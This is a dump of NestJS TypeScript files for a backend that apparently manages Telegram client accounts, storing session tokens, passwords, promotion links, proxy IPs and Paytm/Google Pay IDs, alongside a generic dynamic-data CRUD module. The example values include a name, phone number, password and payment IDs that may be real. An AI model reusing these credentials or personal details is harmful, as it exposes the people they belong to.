   readonly link: string;\n\n    @ApiProperty({ example: 'Shruthi Reddy', description: 'Name of the user' })\n    readonly name: string;\n\n    @ApiProperty({ example: '+916265240911', description: 'Phone number of the user' })\n    readonly mobile: string;\n\n    @ApiProperty({ example: 'Ajtdmwajt1@', description: 'Password of the user' })\n    readonly password: string;\n\n    @ApiProperty({ example: 'https://shruthi1.glitch.me', description: 'Repl link of the user' })\n    readonly repl: string;\n\n    @ApiProperty({ example: 'https://shruthiprom0101.glitch.me', description: 'Promotion Repl link of the user' })\n    readonly promoteRepl: string;\n\n    @ApiProperty({ example: '1BQANOTEuMTA4LjUg==', description: 'Session token' })\n    readonly session: string;\n\n    @ApiProperty({ example: 'ShruthiRedd2', description: 'Username of the user' })\n    readonly username: string;\n\n    @ApiProperty({ example: 'shruthi1', description: 'Client ID of the user' })\n    readonly clientId: string;\n\n    @ApiProperty({ example: 'https://shruthi1.glitch.me/exit', description: 'Deployment key URL' })\n    readonly deployKey: string;\n\n    @ApiProperty({ example: 'ShruthiRedd2', description: 'Main account of the user' })\n    readonly mainAccount: string;\n\n    @ApiProperty({ example: 'booklet_10', description: 'Product associated with the user' })\n    readonly product: string;\n\n    @ApiProperty({ example: 'paytmqr281005050101xv6mfg02t4m9@paytm', description: 'Paytm QR ID of the user', required: false })\n    readonly qrId: string;\n\n    @ApiProperty({ example: 'myred1808@postbank', description: 'Google Pay ID of the user', required: false })\n    readonly gpayId: string;\n\n    @ApiProperty({ example: ['192.168.1.100:8080', '192.168.1.101:8080'], description: 'Dedicated proxy IPs assigned to this client', required: false })\n    readonly dedicatedIps?: string[];\n\n    @ApiProperty({ example: 'US', description: 'Preferred country for IP assignment', required: false })\n    readonly preferredIpCountry?: string;\n\n    @ApiProperty({ example: true, description: 'Whether to auto-assign IPs to mobile numbers', required: false })\n    readonly autoAssignIps?: boolean;\n}\n","export * from './create-client.dto';\nexport * from './search-client.dto';\nexport * from './update-client.dto';\nexport * from './setup-client.dto';\n","import { ApiPropertyOptional } from '@nestjs/swagger';\nimport { Transform, TransformFnParams } from 'class-transformer';\nimport { IsOptional, IsString, IsArray, IsUrl, Matches, ArrayNotEmpty } from 'class-validator';\n\nexport class SearchClientDto {\n    @ApiPropertyOptional({ description: 'Client ID of the client' })\n    @Transform(({ value }: TransformFnParams) => value?.trim().toLowerCase())\n    @IsOptional()\n    @IsString()\n    @Matches(/^[a-z0-9_-]{3,50}$/i, { message: 'Invalid client ID format' })\n    clientId?: string;\n\n    @ApiPropertyOptional({ description: 'Database collection name' })\n    @Transform(({ value }: TransformFnParams) => value?.trim().toLowerCase())\n    @IsOptional()\n    @IsString()\n    dbcoll?: string;\n\n    @ApiPropertyOptional({ description: 'Channel link of the client' })\n    @Transform(({ value }: TransformFnParams) => value?.trim())\n    @IsOptional()\n    @IsString()\n    channelLink?: string;\n\n    @ApiPropertyOptional({ description: 'Link of the client' })\n    @Transform(({ value }: TransformFnParams) => value?.trim())\n    @IsOptional()\n    @IsUrl({}, { message: 'Invalid URL format' })\n    link?: string;\n\n    @ApiPropertyOptional({ description: 'Name of the client' })\n    @Transform(({ value }: TransformFnParams) => value?.trim())\n    @IsOptional()\n    @IsString()\n    name?: string;\n\n    @ApiPropertyOptional({ description: 'Phone number of the client' })\n    @Transform(({ value }: TransformFnParams) => value?.trim())\n    @IsOptional()\n    @Matches(/^\\+?[0-9]{10,15}$/, { message: 'Invalid phone number format' })\n    number?: string;\n\n    @ApiPropertyOptional({ description: 'Password of the client' })\n    @IsOptional()\n    @IsString()\n    password?: string;\n\n    @ApiPropertyOptional({ description: 'Repl link of the client' })\n    @Transform(({ value }: TransformFnParams) => value?.trim())\n    @IsOptional()\n    @IsUrl({}, { message: 'Invalid URL format' })\n    repl?: string;\n\n    @ApiPropertyOptional({ description: 'Promotion Repl link of the client' })\n    @Transform(({ value }: TransformFnParams) => value?.trim())\n    @IsOptional()\n    @IsUrl({}, { message: 'Invalid URL format' })\n    promoteRepl?: string;\n\n    @ApiPropertyOptional({ description: 'Clientname of the client' })\n    @Transform(({ value }: TransformFnParams) => value?.trim())\n    @IsOptional()\n    @IsString()\n    clientName?: string;\n\n    @ApiPropertyOptional({ description: 'Deployment key URL' })\n    @Transform(({ value }: TransformFnParams) => value?.trim())\n    @IsOptional()\n    @IsUrl({}, { message: 'Invalid URL format' })\n    deployKey?: string;\n\n    @ApiPropertyOptional({ description: 'Main account of the client' })\n    @Transform(({ value }: TransformFnParams) => value?.trim().toLowerCase())\n    @IsOptional()\n    @IsString()\n    mainAccount?: string;\n\n    @ApiPropertyOptional({ description: 'Product associated with the client' })\n    @Transform(({ value }: TransformFnParams) => value?.trim())\n    @IsOptional()\n    @IsString()\n    product?: string;\n\n    @ApiPropertyOptional({ description: 'Search by client ID that has promote mobiles assigned' })\n    @Transform(({ value }: TransformFnParams) => value?.trim().toLowerCase())\n    @IsOptional()\n    @IsString()\n    @Matches(/^(true|false)$/i, { message: 'hasPromoteMobiles must be either \"true\" or \"false\"' })\n    hasPromoteMobiles?: string;\n\n    @ApiPropertyOptional({ description: 'Paytm QR ID of the client' })\n    @Transform(({ value }: TransformFnParams) => value?.trim())\n    @IsOptional()\n    @IsString()\n    qrId?: string;\n\n    @ApiPropertyOptional({ description: 'Google Pay ID of the client' })\n    @Transform(({ value }: TransformFnParams) => value?.trim())\n    @IsOptional()\n    @IsString()\n    gpayId?: string;\n}\n","import { ApiPropertyOptional } from '@nestjs/swagger';\nimport { Transform, TransformFnParams, Type } from 'class-transformer';\nimport { IsOptional, IsString, IsBoolean, IsNumber } from 'class-validator';\n\nexport class SetupClientQueryDto {\n    @ApiPropertyOptional({\n        type: Number,\n        default: 3\n    })\n    @IsOptional()\n    @Type(() => Number)\n    @IsNumber()\n    days?: number = 0;\n\n    @ApiPropertyOptional({\n        default: true\n    })\n    @IsOptional()\n    @Transform(({ value }) => {\n        console.log(\"archiveOld: \", value)\n        return value === 'true' || value === true\n    })\n    @IsBoolean()\n    archiveOld: boolean = true;\n\n    @ApiPropertyOptional({\n        type: String\n    })\n    @IsOptional()\n    @IsString()\n    mobile?: string;\n\n    @ApiPropertyOptional({\n        default: true\n    })\n    @IsOptional()\n    @Transform(({ value }) => {\n        console.log(\"formalities: \", value)\n        return value === 'true' || value === true\n    })\n    @IsBoolean()\n    formalities: boolean = true;\n}\n","import { PartialType } from '@nestjs/swagger';\nimport { CreateClientDto } from './create-client.dto';\n\nexport class UpdateClientDto extends PartialType(CreateClientDto) {}\n","// Public API\nexport { ClientController } from './client.controller';\nexport { ClientModule } from './client.module';\nexport { ClientService } from './client.service';\nexport * from './dto';\nexport * from './schemas';\n","import { Prop, Schema, SchemaFactory } from '@nestjs/mongoose';\nimport { ApiProperty } from '@nestjs/swagger';\nimport { Document } from 'mongoose';\n\nexport type ClientDocument = Client & Document;\n\n@Schema({\n    collection: 'clients', versionKey: false, autoIndex: true, timestamps: true,\n    toJSON: {\n        virtuals: true,\n        transform: (doc, ret) => {\n            delete ret._id;\n        },\n    },\n})\nexport class Client {\n    @ApiProperty({ example: 'paid_giirl_shruthiee', description: 'Channel link of the user' })\n    @Prop({ required: true })\n    channelLink: string;\n\n    @ApiProperty({ example: 'shruthi', description: 'Database collection name' })\n    @Prop({ required: true })\n    dbcoll: string;\n\n    @ApiProperty({ example: 'PaidGirl.netlify.app/Shruthi1', description: 'Link of the user' })\n    @Prop({ required: true })\n    link: string;\n\n    @ApiProperty({ example: 'Shruthi Reddy', description: 'Name of the user' })\n    @Prop({ required: true })\n    name: string;\n\n    @ApiProperty({ example: '916265240911', description: 'mobile number of the user' })\n    @Prop({ required: true })\n    mobile: string;\n\n    @ApiProperty({ example: 'Ajtdmwajt1@', description: 'Password of the user' })\n    @Prop({ required: true })\n    password: string;\n\n    @ApiProperty({ example: 'https://shruthi1.glitch.me', description: 'Repl link of the user' })\n    @Prop({ required: true })\n    repl: string;\n\n    @ApiProperty({ example: 'https://shruthiprom0101.glitch.me', description: 'Promotion Repl link of the user' })\n    @Prop({ required: true })\n    promoteRepl: string;\n\n    @ApiProperty({ example: '1BQANOTEuM==', description: 'Session token' })\n    @Prop({ required: true })\n    session: string;\n\n    @ApiProperty({ example: 'ShruthiRedd2', description: 'Username of the user' })\n    @Prop({ required: true })\n    username: string;\n\n    @ApiProperty({ example: 'shruthi1', description: 'Client ID of the user' })\n    @Prop({ required: true })\n    clientId: string;\n\n    @ApiProperty({ example: 'https://shruthi1.glitch.me/exit', description: 'Deployment key URL' })\n    @Prop({ required: true })\n    deployKey: string;\n\n    @ApiProperty({ example: 'ShruthiRedd2', description: 'Main account of the user' })\n    @Prop({ required: true })\n    mainAccount: string;\n\n    @ApiProperty({ example: 'booklet_10', description: 'Product associated with the user' })\n    @Prop({ required: true })\n    product: string;\n\n    @ApiProperty({ example: 'paytmqr281005050101xv6mfg02t4m9@paytm', description: 'Paytm QR ID of the user' })\n    @Prop({ required: true })\n    qrId: string;\n\n    @ApiProperty({ example: 'myred1808@postbank', description: 'Google Pay ID of the user' })\n    @Prop({ required: true })\n    gpayId: string;\n\n    @ApiProperty({ example: ['192.168.1.100:8080', '192.168.1.101:8080'], description: 'Dedicated proxy IPs assigned to this client' })\n    @Prop({ required: false, type: [String], default: [] })\n    dedicatedIps?: string[];\n}\n\nexport const ClientSchema = SchemaFactory.createForClass(Client);\n","export * from './client.schema';\n","import { ApiProperty } from '@nestjs/swagger';\r\nimport { IsNotEmpty, IsString } from 'class-validator';\r\n\r\nexport class CreateDynamicDataDto {\r\n  @ApiProperty({\r\n    description: 'Unique identifier for the dynamic data',\r\n    example: 'user123',\r\n  })\r\n  @IsString()\r\n  @IsNotEmpty()\r\n  readonly configKey: string;\r\n\r\n  @ApiProperty({\r\n    description: 'Dynamic JSON data',\r\n    example: {\r\n      profile: {\r\n        name: 'John Doe',\r\n        age: 30,\r\n      },\r\n      preferences: {\r\n        theme: 'dark',\r\n        notifications: true,\r\n      },\r\n    },\r\n  })\r\n  @IsNotEmpty()\r\n  readonly data: any;\r\n}\r\n","import { ApiProperty } from '@nestjs/swagger';\r\nimport { IsOptional, IsString, Matches } from 'class-validator';\r\n\r\nexport class GetDynamicDataDto {\r\n  @ApiProperty({\r\n    description: 'Path to retrieve specific data using dot notation',\r\n    example: 'profile.name',\r\n    required: false,\r\n  })\r\n  @IsOptional()\r\n  @IsString()\r\n  @Matches(/^[a-zA-Z0-9]+([\\._][a-zA-Z0-9]+)*$/, {\r\n    message: 'Invalid path format. Use dot notation (e.g., profile.name)',\r\n  })\r\n  readonly path?: string;\r\n}\r\n","import { ApiProperty } from '@nestjs/swagger';\r\nimport { IsEnum, IsNotEmpty, IsOptional, IsString, Matches } from 'class-validator';\r\n\r\nexport enum ArrayOperationType {\r\n    PUSH = 'PUSH',\r\n    POP = 'POP',\r\n    INSERT = 'INSERT',\r\n    REMOVE = 'REMOVE',\r\n    UPDATE = 'UPDATE',\r\n}\r\n\r\nexport class ArrayOperation {\r\n    @ApiProperty({\r\n        enum: ArrayOperationType,\r\n        description: 'Type of array operation to perform',\r\n    })\r\n    @IsEnum(ArrayOperationType)\r\n    type: ArrayOperationType;\r\n\r\n    @ApiProperty({\r\n        description: 'Index for array operations (required for INSERT and UPDATE)',\r\n        required: false,\r\n    })\r\n    @IsOptional()\r\n    index?: number;\r\n}\r\n\r\nexport class UpdateDynamicDataDto {\r\n    @ApiProperty({\r\n        description: 'Path to the field to update using dot notation. If not provided, updates entire data object.',\r\n        example: 'profile.age',\r\n        required: false,\r\n    })\r\n    @IsOptional()\r\n    @IsString()\r\n    @Matches(/^[a-zA-Z0-9]+([\\._][a-zA-Z0-9]+)*$/, {\r\n        message: 'Invalid path format. Use dot notation (e.g., profile.age)',\r\n    })\r\n    readonly path?: string;\r\n\r\n    @ApiProperty({\r\n        description: 'New value for the field or entire data object if path is not provided',\r\n        example: { profile: { age: 31 } },\r\n    })\r\n    @IsNotEmpty()\r\n    readonly value: any;\r\n\r\n    @ApiProperty({\r\n        description: 'Array operation configuration',\r\n        required: false,\r\n        type: ArrayOperation,\r\n    })\r\n    @IsOptional()\r\n    readonly arrayOperation?: ArrayOperation;\r\n}\r\n","import {\r\n  Controller,\r\n  Get,\r\n  Post,\r\n  Body,\r\n  Patch,\r\n  Param,\r\n  Delete,\r\n  Query,\r\n  HttpCode,\r\n  HttpStatus,\r\n} from '@nestjs/common';\r\nimport { ApiTags, ApiOperation, ApiResponse, ApiParam, ApiQuery } from '@nestjs/swagger';\r\nimport { DynamicDataService } from './dynamic-data.service';\r\nimport { CreateDynamicDataDto } from './dto/create-dynamic-data.dto';\r\nimport { UpdateDynamicDataDto } from './dto/update-dynamic-data.dto';\r\nimport { GetDynamicDataDto } from './dto/get-dynamic-data.dto';\r\n\r\n@ApiTags('dynamic-data')\r\n@Controller('dynamic-data')\r\nexport class DynamicDataController {\r\n  constructor(private readonly dynamicDataService: DynamicDataService) {}\r\n\r\n  @Post()\r\n  @ApiOperation({ summary: 'Create a new dynamic data document' })\r\n  @ApiResponse({\r\n    status: 201,\r\n    description: 'The dynamic data document has been successfully created.',\r\n  })\r\n  @ApiResponse({ status: 400, description: 'Bad Request' })\r\n  @ApiResponse({ status: 409, description: 'Conflict - Document already exists' })\r\n  async create(@Body() createDynamicDataDto: CreateDynamicDataDto) {\r\n    return this.dynamicDataService.create(createDynamicDataDto);\r\n  }\r\n\r\n  @Get()\r\n  @ApiOperation({ summary: 'Get all dynamic data documents' })\r\n  @ApiResponse({\r\n    status: 200,\r\n    description: 'Returns all dynamic data documents as a key-value object',\r\n  })\r\n  async findAll() {\r\n    return this.dynamicDataService.findAll();\r\n  }\r\n\r\n  @Post('check-npoint')\r\n  @HttpCode(HttpStatus.OK)\r\n  @ApiOperation({ summary: 'Check and update npoint data if needed' })\r\n  @ApiResponse({ status: 200, description: 'Npoint data check completed successfully' })\r\n  async checkNpoint() {\r\n    await this.dynamicDataService.checkNpoint();\r\n    return { message: 'Npoint check completed' };\r\n  }\r\n\r\n  @Get(':configKey')\r\n  @ApiOperation({ summary: 'Get dynamic data by configKey' })\r\n  @ApiParam({ name: 'configKey', description: 'Unique identifier for the document' })\r\n  @ApiQuery({\r\n    name: 'path',\r\n    required: false,\r\n    description: 'Optional path to retrieve specific nested data',\r\n  })\r\n  @ApiResponse({ status: 200, description: 'Returns the requested dynamic data' })\r\n  @ApiResponse({ status: 404, description: 'Document or path not found' })\r\n  async findOne(\r\n    @Param('configKey') configKey: string,\r\n    @Query() { path }: GetDynamicDataDto,\r\n  ) {\r\n    return this.dynamicDataService.findOne(configKey, path);\r\n  }\r\n\r\n  @Patch(':configKey')\r\n  @ApiOperation({ summary: 'Update dynamic data by configKey' })\r\n  @ApiParam({ name: 'configKey', description: 'Unique identifier for the document' })\r\n  @ApiResponse({ status: 200, description: 'The dynamic data has been successfully updated' })\r\n  @ApiResponse({ status: 400, description: 'Bad Request' })\r\n  @ApiResponse({ status: 404, description: 'Document not found' })\r\n  async update(\r\n    @Param('configKey') configKey: string,\r\n    @Body() updateDynamicDataDto: UpdateDynamicDataDto,\r\n  ) {\r\n    return this.dynamicDataService.update(configKey, updateDynamicDataDto);\r\n  }\r\n\r\n  @Delete(':configKey')\r\n  @HttpCode(HttpStatus.NO_CONTENT)\r\n  @ApiOperation({ summary: 'Delete dynamic data by configKey' })\r\n  @ApiParam({ name: 'configKey', description: 'Unique identifier for the document' })\r\n  @ApiQuery({\r\n    name: 'path',\r\n    required: false,\r\n    description: 'Optional path to delete specific nested data',\r\n  })\r\n  @ApiResponse({ status: 204, description: 'The dynamic data has been successfully deleted' })\r\n  @ApiResponse({ status: 404, description: 'Document or path not found' })\r\n  async remove(\r\n    @Param('configKey') configKey: string,\r\n    @Query() { path }: GetDynamicDataDto,\r\n  ) {\r\n    await this.dynamicDataService.remove(configKey, path);\r\n  }\r\n}\r\n","import { Module } from '@nestjs/common';\r\nimport { MongooseModule } from '@nestjs/mongoose';\r\nimport { DynamicDataController } from './dynamic-data.controller';\r\nimport { DynamicDataService } from './dynamic-data.service';\r\nimport { DynamicData, DynamicDataSchema } from './dynamic-data.schema';\r\nimport { NpointModule } from '../n-point';\r\n\r\n@Module({\r\n  imports: [\r\n    MongooseModule.forFeature([\r\n      { name: DynamicData.name, schema: DynamicDataSchema },\r\n    ]),\r\n    NpointModule,\r\n  ],\r\n  controllers: [DynamicDataController],\r\n  providers: [DynamicDataService],\r\n  exports: [DynamicDataService],\r\n})\r\nexport class DynamicDataModule {}\r\n","import { Prop, Schema, SchemaFactory } from '@nestjs/mongoose';\r\nimport { Document, Schema as MongooseSchema } from 'mongoose';\r\n\r\nexport type DynamicDataDocument = DynamicData & Document;\r\n\r\n@Schema({\r\n  collection: 'dynamic_data',\r\n  versionKey: false,\r\n  timestamps: true,\r\n  strict: false,\r\n  toJSON: {\r\n    transform: (_, ret) => {\r\n      delete ret._id;\r\n      return ret;\r\n    },\r\n  },\r\n})\r\nexport class DynamicData {\r\n  @Prop({ required: true, unique: true, type: String })\r\n  configKey: string;\r\n\r\n  @Prop({ type: MongooseSchema.Types.Mixed, required: true })\r\n  data: any;\r\n}\r\n\r\nexport const DynamicDataSchema = SchemaFactory.createForClass(DynamicData);\r\n","import { Injectable, NotFoundException, BadRequestException, ConflictException } from '@nestjs/common';\r\nimport { InjectModel } from '@nestjs/mongoose';\r\nimport { Model, ClientSession } from 'mongoose';\r\nimport { DynamicData, DynamicDataDocument } from './dynamic-data.schema';\r\nimport { CreateDynamicDataDto } from './dto/create-dynamic-data.dto';\r\nimport { UpdateDynamicDataDto, ArrayOperationType } from './dto/update-dynamic-data.dto';\r\nimport { get, set, unset, has } from 'lodash';\r\nimport { InjectConnection } from '@nestjs/mongoose';\r\nimport * as mongoose from 'mongoose';\r\nimport { parseError, Logger } from '../../utils';\r\nimport { NpointService } from '../n-point/npoint.service';\r\n\r\n@Injectable()\r\nexport class DynamicDataService {\r\n    private readonly logger = new Logger(DynamicDataService.name);\r\n\r\n    constructor(\r\n        @InjectModel(DynamicData.name)\r\n        private dynamicDataModel: Model<DynamicDataDocument>,\r\n        @InjectConnection() private readonly connection: mongoose.Connection,\r\n        private readonly npointService: NpointService,\r\n    ) {}\r\n\r\n    async create(createDto: CreateDynamicDataDto): Promise<DynamicData> {\r\n        this.logger.debug(`Creating dynamic data with configKey: ${createDto.configKey}`);\r\n        const session = await this.connection.startSession();\r\n        try {\r\n            await session.startTransaction();\r\n            this.logger.debug('Started transaction for create operation');\r\n\r\n            const exists = await this.dynamicDataModel.findOne({ configKey: createDto.configKey }).session(session);\r\n            if (exists) {\r\n                this.logger.warn(`Attempted to create duplicate configKey: ${createDto.configKey}`);\r\n                throw new ConflictException(`Document with configKey ${createDto.configKey} already exists`);\r\n            }\r\n\r\n            const created = new this.dynamicDataModel(createDto);\r\n            await created.save({ session });\r\n            this.logger.debug(`Successfully created dynamic data for configKey: ${createDto.configKey}`);\r\n\r\n            await session.commitTransaction();\r\n            this.logger.debug('Transaction committed successfully');\r\n            return created.toJSON().data;\r\n        } catch (error) {\r\n            await session.abortTransaction();\r\n            parseError(error, 'Failed to create dynamic data: ', true);\r\n            this.logger.error(`Failed to create dynamic data: ${error.message}`, error.stack);\r\n            if (error instanceof ConflictException) {\r\n                throw error;\r\n            }\r\n            throw new BadRequestException('Failed to create dynamic data');\r\n        } finally {\r\n            await session.endSession();\r\n        }\r\n    }\r\n\r\n    async findOne(configKey: string, path?: string): Promise<any> {\r\n        this.logger.debug(`Finding dynamic data with configKey: ${configKey}${path ? `, path: ${path}` : ''}`);\r\n        const doc = await this.dynamicDataModel.findOne({ configKey });\r\n        if (!doc) {\r\n            this.logger.warn(`Document not found with configKey: ${configKey}`);\r\n            throw new NotFoundException(`Document with configKey ${configKey} not found`);\r\n        }\r\n\r\n        if (path) {\r\n            if (!has(doc.data, path)) {\r\n                this.logger.warn(`Path ${path} not found in document with configKey: ${configKey}`);\r\n                throw new NotFoundException(`Path ${path} not found in document`);\r\n            }\r\n            this.logger.debug(`Successfully retrieved data at path: ${path}`);\r\n            return get(doc.data, path);\r\n        }\r\n\r\n        this.logger.debug(`Successfully retrieved full document for configKey: ${configKey}`);\r\n        return doc.toJSON().data;\r\n    }\r\n\r\n    async update(\r\n        configKey: string,\r\n        updateDto: UpdateDynamicDataDto,\r\n        session?: ClientSession,\r\n    ): Promise<DynamicData> {\r\n        this.logger.debug(`Updating dynamic data for configKey: ${configKey}`);\r\n        const useSession = session || await this.connection.startSession();\r\n        let shouldEndSession = false;\r\n\r\n        try {\r\n            if (!session) {\r\n                shouldEndSession = true;\r\n                await useSession.startTransaction();\r\n                this.logger.debug('Started new transaction for update operation');\r\n            }\r\n\r\n            const doc = await this.dynamicDataModel.findOne({ configKey }).session(useSession);\r\n            if (!doc) {\r\n                this.logger.warn(`Document not found with configKey: ${configKey}`);\r\n                throw new NotFoundException(`Document with configKey ${configKey} not found`);\r\n            }\r\n\r\n            if (updateDto.arrayOperation) {\r\n                if (!updateDto.path) {\r\n                    this.logger.error('Attempted array operation without specifying path');\r\n                    throw new BadRequestException('Path is required for array operations');\r\n                }\r\n                this.logger.debug(`Performing array operation: ${updateDto.arrayOperation.type} on path: ${updateDto.path}`);\r\n                await this.handleArrayOperation(doc, updateDto, useSession);\r\n            } else if (updateDto.path) {\r\n                if (!has(doc.data, updateDto.path)) {\r\n                    this.logger.warn(`Path ${updateDto.path} not found in document with configKey: ${configKey}`);\r\n                    throw new NotFoundException(`Path ${updateDto.path} not found in document`);\r\n                }\r\n                this.logger.debug(`Updating value at path: ${updateDto.path}`);\r\n                set(doc.data, updateDto.path, updateDto.value);\r\n            } else {\r\n                this.logger.debug('Performing full data update');\r\n                doc.data = updateDto.value;\r\n            }\r\n\r\n            await doc.save({ session: useSession });\r\n            this.logger.debug(`Successfully updated document with configKey: ${configKey}`);\r\n\r\n            if (shouldEndSession) {\r\n                await useSession.commitTransaction();\r\n                this.logger.debug('Transaction committed successfully');\r\n            }\r\n\r\n            return doc.toJSON();\r\n        } catch (error) {\r\n            if (shouldEndSession) {\r\n                await useSession.abortTransaction();\r\n                this.logger.error('Transaction aborted due to error');\r\n            }\r\n            parseError(error, 'Failed to update dynamic data: ', true);\r\n            this.logger.error(`Failed to update dynamic data: ${error.message}`, error.stack);\r\n            throw error;\r\n        } finally {\r\n            if (shouldEndSession) {\r\n                await useSession.endSession();\r\n            }\r\n        }\r\n    }\r\n\r\n    private async handleArrayOperation(\r\n        doc: DynamicDataDocument,\r\n        updateDto: UpdateDynamicDataDto,\r\n        session: ClientSession,\r\n    ): Promise<void> {\r\n        this.logger.debug(`Handling array operation: ${updateDto.arrayOperation.type} at path: ${updateDto.path}`);\r\n        const array = get(doc.data, updateDto.path);\r\n        if (!Array.isArray(array)) {\r\n            this.logger.error(`Path ${updateDto.path} is not an array`);\r\n            throw new BadRequestException(`Path ${updateDto.path} is not an array`);\r\n        }\r\n\r\n        const { type, index } = updateDto.arrayOperation;\r\n        try {\r\n            switch (type) {\r\n                case ArrayOperationType.PUSH:\r\n                    this.logger.debug(`Pushing new value to array at path: ${updateDto.path}`);\r\n                    array.push(updateDto.value);\r\n                    break;\r\n                case ArrayOperationType.POP:\r\n                    this.logger.debug(`Popping value from array at path: ${updateDto.path}`);\r\n                    array.pop();\r\n                    break;\r\n                case ArrayOperationType.INSERT:\r\n                    if (index === undefined || index < 0 || index > array.length) {\r\n                        this.logger.error(`Invalid index ${index} for INSERT operation`);\r\n                        throw new BadRequestException('Invalid array index for INSERT operation');\r\n                    }\r\n                    this.logger.debug(`Inserting value at index ${index} in array at path: ${updateDto.path}`);\r\n                    array.splice(index, 0, updateDto.value);\r\n                    break;\r\n                case ArrayOperationType.REMOVE:\r\n                    if (index === undefined || index < 0 || index >= array.length) {\r\n                        this.logger.error(`Invalid index ${index} for REMOVE operation`);\r\n                        throw new BadRequestException('Invalid array index for REMOVE operation');\r\n                    }\r\n                    this.logger.debug(`Removing value at index ${index} from array at path: ${updateDto.path}`);\r\n                    array.splice(index, 1);\r\n                    break;\r\n                case ArrayOperationType.UPDATE:\r\n                    if (index === undefined || index < 0 || index >= array.length) {\r\n                        this.logger.error(`Invalid index ${index} for UPDATE operation`);\r\n                        throw new BadRequestException('Invalid array index for UPDATE operation');\r\n                    }\r\n                    this.logger.debug(`Updating value at index ${index} in array at path: ${updateDto.path}`);\r\n                    array[index] = updateDto.value;\r\n                    break;\r\n                default:\r\n                    this.logger.error(`Invalid array operation type: ${type}`);\r\n                    throw new BadRequestException('Invalid array operation type');\r\n            }\r\n\r\n            set(doc.data, updateDto.path, array);\r\n            await doc.save({ session });\r\n            this.logger.debug('Array operation completed successfully');\r\n        } catch (error) {\r\n            this.logger.error(`Array operation failed: ${error.message}`, error.stack);\r\n            throw error;\r\n        }\r\n    }\r\n\r\n    async remove(configKey: string, path?: string): Promise<void> {\r\n        this.logger.debug(`Removing dynamic data for configKey: ${configKey}${path ? `, path: ${path}` : ''}`);\r\n        const session = await this.connection.startSession();\r\n        try {\r\n            await session.startTransaction();\r\n            this.logger.debug('Started transaction for remove operation');\r\n\r\n            const doc = await this.dynamicDataModel.findOne({ configKey }).session(session);\r\n            if (!doc) {\r\n                this.logger.warn(`Document not found with configKey: ${configKey}`);\r\n                throw new NotFoundException(`Document with configKey ${configKey} not found`);\r\n            }\r\n\r\n            if (path) {\r\n                if (!has(doc.data, path)) {\r\n                    this.logger.warn(`Path ${path} not found in document with configKey: ${configKey}`);\r\n                    throw new NotFoundException(`Path ${path} not found in document`);\r\n                }\r\n                this.logger.debug(`Removing data at path: ${path}`);\r\n                unset(doc.data, path);\r\n                await doc.save({ session });\r\n            } else {\r\n                this.logger.debug(`Deleting entire document with configKey: ${configKey}`);\r\n                await this.dynamicDataModel.deleteOne({ configKey }).session(session);\r\n            }\r\n\r\n            await session.commitTransaction();\r\n            this.logger.debug('Transaction committed successfully');\r\n        } catch (error) {\r\n            await session.abortTransaction();\r\n            parseError(error, 'Failed to remove dynamic data: ', true);\r\n            this.logger.error(`Failed to remove dynamic data: ${error.message}`, error.stack);\r\n            throw error;\r\n        } finally {\r\n            await session.endSession();\r\n        }\r\n    }\r\n\r\n    async findAll(): Promise<Record<string, any>> {\r\n        this.logger.debug('Retrieving all dynamic data documents');\r\n        try {\r\n            const documents = await this.dynamicDataModel.find().exec();\r\n            const result = documents.reduce((acc, doc) => {\r\n                acc[doc.configKey] = doc.toJSON().data;\r\n                return acc;\r\n            }, {} as Record<string, any>);\r\n\r\n            this.logger.debug(`Successfully retrieved ${documents.length} dynamic data documents`);\r\n            return result;\r\n        } catch (error) {\r\n            parseError(error, 'Failed to retrieve all dynamic data: ', true);\r\n            this.logger.error(`Failed to retrieve all dynamic data: ${error.message}`, error.stack);\r\n            throw error;\r\n        }\r\n    }\r\n\r\n    async checkNpoint(): Promise<void> {\r\n        // this.logger.debug('Checking npoint data for updates');\r\n        // try {\r\n        //     const response = await axios.get('https://api.npoint.io/6841a4c0c23bdc78333d');\r\n        //     const npointData = response.data;\r\n        //     this.logger.debug('Fetched npoint data successfully');\r\n        //     const existingData = await this.findAll();\r\n        //     if (areJsonsNotSame(existingData, npointData)) {\r\n        //         await this.npointService.updateDocument('6841a4c0c23bdc78333d', existingData);\r\n        //         this.logger.debug('Npoint data updated successfully');\r\n        //     } else {\r\n        //         this.logger.debug('No updates needed for npoint data');\r\n        //     }\r\n        // } catch (error) {\r\n        //     this.logger.error(`Failed to check/update npoint data: ${error.message}`, error.stack);\r\n        //     parseError(error, 'Failed to check/update npoint data: ', true);\r\n        //     throw error;\r\n        // }\r\n    }\r\n}\r\n","export * from './dynamic-data.controller';\r\nexport * from './dynamic-data.service';\r\nexport * from './dynamic-data.module';\r\nexport * from './dynamic-data.schema';\r\nexport * from './dto/create-dynamic-data.dto';\r\nexport * from './dto/update-dynamic-data.dto';\r\nexport * from './dto/get-dynamic-data.dto';\r\n","// Core components\nexport * from './active-channels';\nexport * from './buffer-clients';\nexport * from './builds';\nexport * from './channels';\nexport * from './clients';\nexport * from './ConfigurationInit';\nexport * from './n-point';\nexport * from './session-manager';\n\n// Stats and Analytics\nexport * from './stats';\nexport * from './stats2';\nexport * from './promote-stats';\n\n// Promotion components\nexport * from './promote-clients';\nexport * from './promote-msgs';\n\n// User Management\nexport * from './user-data';\nexport * from './users';\n\n// Authentication & Telegram\nexport * from './Telegram';\nexport * from './TgSignup';\n\n// IP Management\nexport * from './ip-management';\n\n// System components\nexport * from './timestamps';\nexport * from './transactions';\nexport * from './upi-ids';\n\n// Shared utilities\nexport * from './shared';\nexport * from './dynamic-data'\n\nexport * from './bots';","import { ApiProperty } from '@nestjs/swagger';\r\nimport { IsString, IsNumber, IsOptional, IsEnum, IsBoolean, IsDateString } from 'class-validator';\r\n\r\nexport class CreateProxyIpDto {\r\n    @ApiProperty({ example: '192.168.1.100', description: 'IP address of the proxy' })\r\n    @IsString()\r\n    ipAddress: string;\r\n\r\n    @ApiProperty({ example: 8080, description: 'Port number of the proxy' })\r\n    @IsNumber()\r\n    port: number;\r\n\r\n    @ApiProperty({ example: 'http', description: 'Protocol type', enum: ['http', 'https', 'socks5'] })\r\n    @IsEnum(['http', 'https', 'socks5'])\r\n    protocol: string;\r\n\r\n    @ApiProperty({ example: 'username', description: 'Username for proxy authentication', required: false })\r\n    @IsOptional()\r\n    @IsString()\r\n    username?: string;\r\n\r\n    @ApiProperty({ example: 'password', description: 'Password for proxy authentication', required: false })\r\n    @IsOptional()\r\n    @IsString()\r\n    password?: string;\r\n\r\n    @ApiProperty({ example: 'active', description: 'Status of the proxy IP', enum: ['active', 'inactive'], required: false })\r\n    @IsOptional()\r\n    @IsEnum(['active', 'inactive'])\r\n  